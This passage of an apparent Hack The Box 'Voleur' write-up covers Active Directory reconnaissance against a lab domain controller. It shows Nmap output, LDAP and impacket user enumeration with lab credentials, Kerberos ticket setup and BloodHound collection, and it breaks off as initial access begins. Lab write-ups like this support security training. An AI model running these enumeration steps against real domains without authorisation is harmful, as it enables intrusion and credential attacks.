</span></span><span style="display:flex;"><span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%TG<span style="color:#f92672">=</span>80%CD<span style="color:#f92672">=</span>Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Uptime guess: 0.004 days <span style="color:#f92672">(</span>since Sat Jul  <span style="color:#ae81ff">5</span> 21:36:49 2025<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
</span></span><span style="display:flex;"><span>TCP Sequence Prediction: Difficulty<span style="color:#f92672">=</span><span style="color:#ae81ff">262</span> <span style="color:#f92672">(</span>Good luck!<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>IP ID Sequence Generation: Incremental
</span></span><span style="display:flex;"><span>Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2025-07-06T03:42:37
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>| p2p-conficker: 
</span></span><span style="display:flex;"><span>|   Checking <span style="color:#66d9ef">for</span> Conficker.C or higher...
</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>port 62173/tcp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>port 65250/tcp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>port 43717/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>port 39257/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span><span style="display:flex;"><span>|_clock-skew: 8h00m19s
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:1:1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 445/tcp<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>HOP RTT      ADDRESS
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   25.92 ms 10.10.14.1
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   26.78 ms 10.129.196.199
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sat Jul  5 21:42:55 2025 -- 1 IP address (1 host up) scanned in 234.63 seconds</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The initial reconnaissance phase began with a comprehensive Nmap scan to identify all open ports and services.</p>
<p><strong>Key Services Discovered:</strong></p>
<ul>
<li><strong>53/tcp (DNS)</strong> - Essential for domain name resolution in Active Directory environments</li>
<li><strong>88/tcp (Kerberos)</strong> - Core authentication protocol for Windows domains</li>
<li><strong>389/tcp (LDAP)</strong> - Directory services for domain queries and authentication</li>
<li><strong>445/tcp (SMB)</strong> - File sharing and administrative access</li>
<li><strong>2222/tcp (SSH)</strong> - Unusual service for a Windows DC, suggesting WSL or custom implementation</li>
<li><strong>5985/tcp (WinRM)</strong> - Windows Remote Management for PowerShell remoting</li>
</ul>
<p>The discovery of SSH on port 2222 was particularly noteworthy, as this is atypical for Windows Domain Controllers and suggested the presence of Windows Subsystem for Linux (WSL) or a custom SSH implementation. This would prove crucial in later phases of the attack.</p>
<p><strong>1.2 Domain Enumeration</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Time synchronization</span>
</span></span><span style="display:flex;"><span>ntpdate voleur.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Basic LDAP enumeration</span>
</span></span><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.196.199 -D <span style="color:#e6db74">&#34;ryan.naylor@voleur.htb&#34;</span> -w <span style="color:#e6db74">&#39;HollowOct31Nyt&#39;</span> -b <span style="color:#e6db74">&#34;dc=voleur,dc=htb&#34;</span> <span style="color:#e6db74">&#34;(objectClass=*)&#34;</span> -s base
</span></span></code></pre></td></tr></table>
</div>
</div><p>Domain enumeration began with time synchronization using <code>ntpdate</code>, which is critical for Kerberos authentication as it requires synchronized clocks between client and server (typically within 5 minutes). The LDAP enumeration provided initial validation of the provided credentials and confirmed the domain structure. This baseline enumeration established the foundation for more detailed reconnaissance using specialized tools.</p>
<p><strong>1.3 BloodHound &amp; ldap Collection</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/HTB_Challenges/Machines/Season8/Voleur<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# ntpdate voleur.htb <span style="color:#f92672">&amp;&amp;</span> impacket-GetADUsers -all <span style="color:#e6db74">&#39;voleur.htb/ryan.naylor:HollowOct31Nyt&#39;</span> -dc-ip $ip -k -no-pass -dc-host dc.voleur.htb 
</span></span><span style="display:flex;"><span>2025-07-06 06:07:16.595561 <span style="color:#f92672">(</span>+0200<span style="color:#f92672">)</span> +28808.566181 +/- 0.011743 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span style="display:flex;"><span>CLOCK: time stepped by 28808.566181
</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Querying dc.voleur.htb <span style="color:#66d9ef">for</span> information about domain.
</span></span><span style="display:flex;"><span>Name                  Email                           PasswordLastSet      LastLogon           
</span></span><span style="display:flex;"><span>--------------------  ------------------------------  -------------------  -------------------
</span></span><span style="display:flex;"><span>Administrator                                         2025-01-28 21:35:13.766711  2025-07-06 05:38:12.746180 
</span></span><span style="display:flex;"><span>Guest                                                 &lt;never&gt;              &lt;never&gt;             
</span></span><span style="display:flex;"><span>krbtgt                                                2025-01-29 09:43:06.152684  &lt;never&gt;             
</span></span><span style="display:flex;"><span>ryan.naylor                                           2025-01-29 10:26:46.368695  2025-07-06 06:04:52.387272 
</span></span><span style="display:flex;"><span>marie.bryant                                          2025-01-29 10:21:07.540658  &lt;never&gt;             
</span></span><span style="display:flex;"><span>lacey.miller                                          2025-01-29 10:20:10.758901  &lt;never&gt;             
</span></span><span style="display:flex;"><span>svc_ldap                                              2025-01-29 10:20:54.900094  2025-01-31 10:37:45.081360 
</span></span><span style="display:flex;"><span>svc_backup                                            2025-01-29 10:20:36.962381  2025-07-06 05:38:00.277418 
</span></span><span style="display:flex;"><span>svc_iis                                               2025-01-29 10:20:45.883878  &lt;never&gt;             
</span></span><span style="display:flex;"><span>jeremy.combs                                          2025-01-29 16:10:32.242480  2025-01-30 12:51:02.392951 
</span></span><span style="display:flex;"><span>svc_winrm                                             2025-01-31 10:10:12.398769  2025-01-29 16:07:32.711487 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/HTB_Challenges/Machines/Season8/Voleur<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# ntpdate voleur.htb <span style="color:#f92672">&amp;&amp;</span> impacket-GetADComputers <span style="color:#e6db74">&#39;voleur.htb/ryan.naylor:HollowOct31Nyt&#39;</span> -dc-ip $ip -k -no-pass -dc-host dc.voleur.htb
</span></span><span style="display:flex;"><span>2025-07-06 06:08:06.505565 <span style="color:#f92672">(</span>+0200<span style="color:#f92672">)</span> +28808.098908 +/- 0.010521 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span style="display:flex;"><span>CLOCK: time stepped by 28808.098908
</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Querying dc.voleur.htb <span style="color:#66d9ef">for</span> information about domain.
</span></span><span style="display:flex;"><span>SAM AcctName     DNS Hostname                         OS Version       OS                   
</span></span><span style="display:flex;"><span>---------------  -----------------------------------  ---------------  --------------------
</span></span><span style="display:flex;"><span>DC$              DC.voleur.htb                        10.0 <span style="color:#f92672">(</span>20348<span style="color:#f92672">)</span>     Windows Server <span style="color:#ae81ff">2022</span> Standard 
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Kerberos setting</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/HTB_Challenges/Machines/Season8/Voleur<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# ntpdate $ip <span style="color:#f92672">&amp;&amp;</span> nxc smb  $ip -u ryan.naylor -p <span style="color:#e6db74">&#39;HollowOct31Nyt&#39;</span> --generate-krb5-file /tmp/krb5.conf 
</span></span><span style="display:flex;"><span>2025-07-06 06:02:52.274677 <span style="color:#f92672">(</span>+0200<span style="color:#f92672">)</span> +28828.481068 +/- 0.010524 10.129.196.199 s1 no-leap
</span></span><span style="display:flex;"><span>CLOCK: time stepped by 28828.481068
</span></span><span style="display:flex;"><span>SMB         10.129.196.199  <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>  x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:voleur.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>NTLM:False<span style="color:#f92672">)</span>                                                                                                  
</span></span><span style="display:flex;"><span>SMB         10.129.196.199  <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> voleur.htb<span style="color:#ae81ff">\r</span>yan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED 
</span></span><span style="display:flex;"><span>                                                                                                                   
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/HTB_Challenges/Machines/Season8/Voleur<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# cat /tmp/krb5.conf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>libdefaults<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    dns_lookup_kdc <span style="color:#f92672">=</span> false
</span></span><span style="display:flex;"><span>    dns_lookup_realm <span style="color:#f92672">=</span> false
</span></span><span style="display:flex;"><span>    default_realm <span style="color:#f92672">=</span> VOLEUR.HTB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>realms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    VOLEUR.HTB <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        kdc <span style="color:#f92672">=</span> dc.voleur.htb
</span></span><span style="display:flex;"><span>        admin_server <span style="color:#f92672">=</span> dc.voleur.htb
</span></span><span style="display:flex;"><span>        default_domain <span style="color:#f92672">=</span> voleur.htb
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>domain_realm<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    .voleur.htb <span style="color:#f92672">=</span> VOLEUR.HTB
</span></span><span style="display:flex;"><span>    voleur.htb <span style="color:#f92672">=</span> VOLEUR.HTB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/HTB_Challenges/Machines/Season8/Voleur<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# export KRB5_CONFIG<span style="color:#f92672">=</span>/tmp/krb5.conf                              
</span></span><span style="display:flex;"><span>                                                                                                                   
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/HTB_Challenges/Machines/Season8/Voleur<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# kinit ryan.naylor                
</span></span><span style="display:flex;"><span>ryan.naylor@VOLEUR.HTB<span style="color:#960050;background-color:#1e0010">&#39;</span>s Password: 
</span></span><span style="display:flex;"><span>                                                                                                                   
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/HTB_Challenges/Machines/Season8/Voleur<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# klist            
</span></span><span style="display:flex;"><span>Credentials cache: FILE:/tmp/krb5cc_0
</span></span><span style="display:flex;"><span>        Principal: ryan.naylor@VOLEUR.HTB
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Issued                Expires               Principal
</span></span><span style="display:flex;"><span>Jul  <span style="color:#ae81ff">6</span> 06:04:52 <span style="color:#ae81ff">2025</span>  Jul  <span style="color:#ae81ff">6</span> 16:04:52 <span style="color:#ae81ff">2025</span>  krbtgt/VOLEUR.HTB@VOLEUR.HTB
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/HTB_Challenges/Machines/Season8/Voleur<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# export KRB5CCNAME<span style="color:#f92672">=</span>/tmp/krb5cc_0   
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/HTB_Challenges/Machines/Season8/Voleur<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# bloodhound-python -u ryan.naylor -d voleur.htb -dc dc.voleur.htb -c All --zip
</span></span></code></pre></td></tr></table>
</div>
</div><p>BloodHound collection represents a critical escalation in reconnaissance sophistication. By configuring Kerberos properly and obtaining a Ticket Granting Ticket (TGT) with <code>kinit</code>, we established authenticated access to the domain. The <code>bloodhound-python</code> collector then systematically enumerated domain objects, relationships, and permissions that would be invisible to traditional scanning methods.</p>
<p><strong>Key Findings:</strong></p>
<ul>
<li><strong>Domain:</strong> voleur.htb</li>
<li><strong>Users:</strong> ryan.naylor, marie.bryant, lacey.miller, jeremy.combs, svc_ldap, svc_winrm, svc_backup</li>
<li><strong>Group:</strong> First-Line Technicians (ryan.naylor is member)</li>
</ul>
<p>The discovery of multiple service accounts (svc_ldap, svc_winrm, svc_backup) immediately suggested potential privilege escalation paths, as service accounts often have elevated permissions and may be vulnerable to Kerberoasting attacks.</p>
<p><img src="/images/writeups/htb/voleur/ryan.png" alt="Ryan Naylor on Bloodhound"></p>
<hr>
<h2 id="phase-2-initial-access"><strong>Phase 2: Initial Access</strong><a href="#phase-2-initial-access" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p><strong>2.1 SMB Share Enumeration (Success with Kerberos)</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
